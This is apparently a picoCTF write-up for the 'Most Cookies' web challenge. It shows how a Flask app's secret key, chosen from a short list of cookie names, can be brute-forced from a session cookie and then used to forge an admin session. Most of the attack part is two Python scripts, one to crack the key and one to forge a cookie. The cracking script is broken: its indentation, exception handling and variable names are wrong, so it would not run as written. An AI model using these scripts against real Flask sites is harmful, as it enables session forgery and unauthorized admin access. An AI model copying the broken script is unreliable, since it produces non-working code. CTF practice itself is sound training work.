# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : Most Cookies
# Description 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

# Source Code Analysis

Examine server.py: The backend code initializes the secret key by picking a random name from a known list of 28 cookie types

    cookie_names = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", 
    "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", 
    "kiss", "biscotti", "butter", "spritz", "snowball", "drop", 
    "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", 
    "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", 
    "macaron", "black and white", "white chocolate macadamia"
     ]
    app.secret_key = random.choice(cookie_names)

Identify the Win Condition: The /display route checks your session value:
    
    if session.get("very_auth") == "admin":
    return render_template("flag.html", value=flag_value, title=title)

The Flaw: Because the secret key is chosen from a tiny, predictable list, you can crack the signature of your current session cookie, discover the exact secret key used by the server, and sign your own admin payload

# explot
we can also use Python scripts to get the value of the secret key, then create a valid session cookie with the admin value

    #!/usr/bin/env python3
    '''
    This script takes in a Flask token as an
    argument and attempts to brute force the
    valid secret key from the words on the
    cookie list
    '''
    import sys, base64
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface
    from itsdangerous import BadSignature, SignatureExpired

    cookie_list = [
    "snickerdoodle","chocolate chip","oatmeal raisin","gingersnap","shortbread",
    "peanut butter","whoopie pie","sugar","molasses","kiss","biscotti","butter",
    "spritz","snowball","drop","thumbprint","pinwheel","wafer","macaroon","fortune",
    "crinkle","icebox","gingerbread","tassie","lebkuchen","macaron","black and white",
    "white chocolate macadamia"
    ]

    def secret_test(secret):
       a=Flask(__name__)
       a.secret_key = secret
       return SecureCookieSessionInterface().get_signing_serializer(a)

    def try_load(token, s):
       return s.loads(token)

    if len(sys.argv)!=2:
       print("usage: ./script.py <session_cookie>"); sys.exit(1)
       token = sys.argv[1].strip()

    for cookie in cookie_list:
      s=secret_test(cookie)
      if s is None: continue
      try:
        d=try_load(token, s)
        print(cookie); print(d); sys.exit(0)
        except SignatureExpired:
            try:
             d=s.loads(token, max_age=None)
             print(k+" (expired)"); print(d); sys.exit(0)
        except Exception:
            pass
    except BadSignature:
        pass
    print("no match"); sys.exit(2)

script uses the secret key to encode data into the Flask cookie

    #!/usr/bin/env python3
    '''
    This script takes in two arguments: 1) a secret key for
    creating Flask session tokens, and 2) a cookie key / value
    pair that we want to embed into the resulting Flask token
    '''

    import sys
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface

    if len(sys.argv) != 3:
      print("usage: python forge_session.py <secret> <key=value>")
      sys.exit(1)

    secret = sys.argv[1]
    pair = sys.argv[2]

    if "=" not in pair:
      print("pair must be in form key=value")
      sys.exit(1)

    k, v = pair.split("=", 1)

    app = Flask(__name__)
    app.secret_key = secret
    s = SecureCookieSessionInterface().get_signing_serializer(app)
    if s is None:
       print("Could not create serializer (is Flask installed?)")
       sys.exit(1)

    session_dict = {k: v}
    cookie = s.dumps(session_dict)
    print(cookie)
                         
                 
                                   
